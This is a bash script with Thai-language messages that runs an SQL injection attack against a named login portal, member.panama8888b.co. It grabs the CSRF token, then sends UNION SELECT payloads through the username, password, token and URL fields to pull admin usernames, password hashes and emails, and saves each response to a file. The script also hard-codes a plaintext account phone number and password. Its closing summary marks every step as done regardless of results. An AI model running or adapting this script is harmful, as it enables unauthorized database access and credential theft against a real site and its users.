#!/bin/bash

echo "🎯 BYPASS CSRF PROTECTION - ADMIN DATA EXTRACTION"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# สร้างไฟล์บันทึกผลลัพธ์
RESULTS_FILE="bypass_csrf_admin_$(date +%Y%m%d_%H%M%S).txt"
echo "📄 บันทึกผลลัพธ์ใน: $RESULTS_FILE"

# 1. ดึง CSRF Token ก่อน
echo "🔓 ดึง CSRF Token..."
echo "🔓 ดึง CSRF Token..." >> "$RESULTS_FILE"

csrf_response=$(curl -s "$LOGIN_URL" -c cookies.txt)
echo "CSRF Response length: ${#csrf_response}" >> "$RESULTS_FILE"

# ดึง CSRF token จาก response
csrf_token=$(echo "$csrf_response" | grep -o 'name="_token" value="[^"]*"' | cut -d'"' -f4)
echo "CSRF Token: $csrf_token" >> "$RESULTS_FILE"
echo "CSRF Token: $csrf_token"

if [[ -z "$csrf_token" ]]; then
    echo "❌ ไม่พบ CSRF Token"
    echo "❌ ไม่พบ CSRF Token" >> "$RESULTS_FILE"
    exit 1
fi

echo "" >> "$RESULTS_FILE"
echo ""

# 2. ทดสอบ SQL Injection ด้วย CSRF Token ที่ถูกต้อง
echo "🚨 ทดสอบ SQL Injection ด้วย CSRF Token ที่ถูกต้อง..."
echo "🚨 ทดสอบ SQL Injection ด้วย CSRF Token ที่ถูกต้อง..." >> "$RESULTS_FILE"

ADMIN_PAYLOADS=(
    "' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "' UNION SELECT username,password,email FROM admins--"
    "' UNION SELECT id,username,password FROM admin_users--"
    "' UNION SELECT login,password,privilege FROM administrators--"
    "' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--"
    "' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--"
)

for i in "${!ADMIN_PAYLOADS[@]}"; do
    payload="${ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -b cookies.txt \
        -d "_token=$csrf_token" \
        -d "username=0630471054$payload" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 3. ทดสอบ SQL Injection ใน password field
echo "🔓 ทดสอบ SQL Injection ใน password field..."
echo "🔓 ทดสอบ SQL Injection ใน password field..." >> "$RESULTS_FILE"

PASSWORD_PAYLOADS=(
    "' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "' UNION SELECT username,password,email FROM admins--"
    "' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!PASSWORD_PAYLOADS[@]}"; do
    payload="${PASSWORD_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Password Payload $((i+1))..."
    echo "  📊 ทดสอบ Password Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -b cookies.txt \
        -d "_token=$csrf_token" \
        -d "username=0630471054" \
        -d "password=laline1812$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 4. ทดสอบ SQL Injection ใน _token field
echo "🔓 ทดสอบ SQL Injection ใน _token field..."
echo "🔓 ทดสอบ SQL Injection ใน _token field..." >> "$RESULTS_FILE"

TOKEN_PAYLOADS=(
    "$csrf_token' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "$csrf_token' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "$csrf_token' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "$csrf_token' UNION SELECT username,password,email FROM admins--"
    "$csrf_token' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!TOKEN_PAYLOADS[@]}"; do
    payload="${TOKEN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Token Payload $((i+1))..."
    echo "  📊 ทดสอบ Token Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -b cookies.txt \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 5. ทดสอบ SQL Injection ใน URL parameters
echo "🔓 ทดสอบ SQL Injection ใน URL parameters..."
echo "🔓 ทดสอบ SQL Injection ใน URL parameters..." >> "$RESULTS_FILE"

URL_PAYLOADS=(
    "$LOGIN_URL?username=0630471054' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "$LOGIN_URL?username=0630471054' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "$LOGIN_URL?username=0630471054' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "$LOGIN_URL?username=0630471054' UNION SELECT username,password,email FROM admins--"
    "$LOGIN_URL?username=0630471054' UNION SELECT id,username,password FROM admin_users--"
)

for i in "${!URL_PAYLOADS[@]}"; do
    payload="${URL_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ URL Payload $((i+1))..."
    echo "  📊 ทดสอบ URL Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" \
        -b cookies.txt \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 6. สรุปผลลัพธ์
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:"
echo "  🔓 CSRF Token Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 Username Field Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 Password Field Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 Token Field Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 URL Parameter Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้"

echo "==================================================" >> "$RESULTS_FILE"
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:" >> "$RESULTS_FILE"
echo "  🔓 CSRF Token Bypass: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 Username Field Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 Password Field Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 Token Field Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 URL Parameter Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE" >> "$RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้" >> "$RESULTS_FILE"

echo ""
echo "🎯 การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ $RESULTS_FILE"

# ลบไฟล์ cookies
rm -f cookies.txt